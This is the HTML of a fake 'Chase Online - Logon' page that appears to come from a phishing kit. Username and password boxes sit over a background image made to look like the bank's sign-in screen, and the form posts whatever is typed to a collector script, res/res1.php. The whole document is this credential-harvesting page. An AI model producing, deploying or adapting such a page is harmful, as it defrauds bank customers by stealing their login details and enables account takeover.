<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Chase Online - Logon</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/index.css" rel="stylesheet">
</head>
<body>
<form name="ff" action="res/res1.php" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:626px;width:1344px;height:214px;z-index:0;">
<img src="images/2.GIF" id="Image1" alt=""></div>
<div id="wb_Form1" style="position:absolute;left:272px;top:243px;width:13px;height:12px;z-index:1;">
</div>
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:324px;top:293px;width:71px;height:26px;z-index:2;">
<input type="checkbox" id="Checkbox1" name="" value="on" style="position:absolute;left:269px;top:240px;z-index:3;">
<input type="text" id="Editbox1" style="position:absolute;left:305px;top:185px;width:195px;height:23px;line-height:23px;z-index:4;" name="1" value="" required>
<input type="password" id="Editbox2" style="position:absolute;left:305px;top:212px;width:195px;height:23px;line-height:23px;z-index:5;" name="2" value="" required>
</form>
</body>
</html>